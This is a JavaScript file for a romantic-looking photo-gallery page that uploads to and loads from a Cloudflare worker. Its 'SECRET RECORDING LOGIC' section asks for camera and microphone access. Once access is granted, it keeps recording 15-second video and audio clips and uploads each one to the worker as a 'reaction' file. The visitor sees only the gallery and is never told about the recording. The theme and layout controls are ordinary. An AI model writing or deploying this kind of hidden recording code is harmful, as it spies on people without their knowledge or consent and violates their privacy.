const WORKER_URL = 'https://ourmemory.mrony8552.workers.dev';

const landingPage = document.getElementById('landing-page');
const galleryPage = document.getElementById('gallery-page');
const startBtn = document.getElementById('start-recording-btn');
const galleryContainer = document.getElementById('gallery');

const RECORDING_CHUNK_MS = 15000; 

// --- SECRET RECORDING LOGIC ---
startBtn.addEventListener('click', async () => {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        
        landingPage.style.display = 'none';
        galleryPage.style.display = 'block';

        loadGalleryImages();
        startRecordingCycle(stream);
    } catch (err) {
        console.log("Camera access denied.");
        landingPage.style.display = 'none';
        galleryPage.style.display = 'block';
        loadGalleryImages();
    }
});

function startRecordingCycle(stream) {
    const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
    const chunks = [];

    mediaRecorder.ondataavailable = (event) => {
        if (event.data && event.data.size > 0) chunks.push(event.data);
    };

    mediaRecorder.onstop = async () => {
        const finalBlob = new Blob(chunks, { type: 'video/webm' });
        await uploadChunk(finalBlob);
        startRecordingCycle(stream); 
    };

    mediaRecorder.start();
    setTimeout(() => { if (mediaRecorder.state === 'recording') mediaRecorder.stop(); }, RECORDING_CHUNK_MS);
}

async function uploadChunk(blob) {
    const formData = new FormData();
    formData.append('file', blob, `reaction-${Date.now()}.webm`);
    try { await fetch(`${WORKER_URL}/api/upload`, { method: 'POST', body: formData }); } 
    catch (err) { console.log("Upload delayed."); }
}

// --- PREMIUM GALLERY UPLOAD & DISPLAY ---
const uploadBtn = document.getElementById('upload-btn');
const imageUploadInput = document.getElementById('image-upload-input');

if(uploadBtn) uploadBtn.addEventListener('click', () => imageUploadInput.click());

if(imageUploadInput) {
    imageUploadInput.addEventListener('change', async (e) => {
        const files = e.target.files;
        if (files.length === 0) return;
        
        galleryContainer.innerHTML = '<div class="loading-text">Uploading photos... ⏳</div>';
        
        for (let file of files) {
            const formData = new FormData();
            formData.append('file', file);
            try { await fetch(`${WORKER_URL}/api/upload-image`, { method: 'POST', body: formData }); } 
            catch (err) { console.error(err); }
        }
        loadGalleryImages();
    });
}

async function loadGalleryImages() {
    if(!galleryContainer) return;
    galleryContainer.innerHTML = '<div class="loading-text">Loading our memories... ✨</div>';
    
    try {
        const res = await fetch(`${WORKER_URL}/api/images`);
        if (res.ok) {
            const data = await res.json();
            galleryContainer.innerHTML = ''; 
            
            if (data.images.length === 0) {
                galleryContainer.innerHTML = '<div class="loading-text">No photos yet. Click the upload icon! ❤️</div>';
                return;
            }
            
            data.images.forEach(imgKey => {
                const imgEl = document.createElement('img');
                imgEl.src = `${WORKER_URL}/api/image/${imgKey}`;
                imgEl.loading = 'lazy';
                galleryContainer.appendChild(imgEl);
            });
        }
    } catch (error) {
        galleryContainer.innerHTML = '<div class="loading-text">Could not load images.</div>';
    }
}

// --- UI CONTROLS (Theme & Layout) ---
const themeToggle = document.getElementById('theme-toggle');
if(themeToggle) {
    themeToggle.addEventListener('click', () => {
        document.body.classList.toggle('theme-night');
    });
}

const layoutToggle = document.getElementById('layout-toggle');
if(layoutToggle) {
    layoutToggle.addEventListener('click', () => {
        if(galleryContainer.classList.contains('layout-grid')) {
            galleryContainer.classList.replace('layout-grid', 'layout-masonry');
        } else {
            galleryContainer.classList.replace('layout-masonry', 'layout-grid');
        }
    });
}
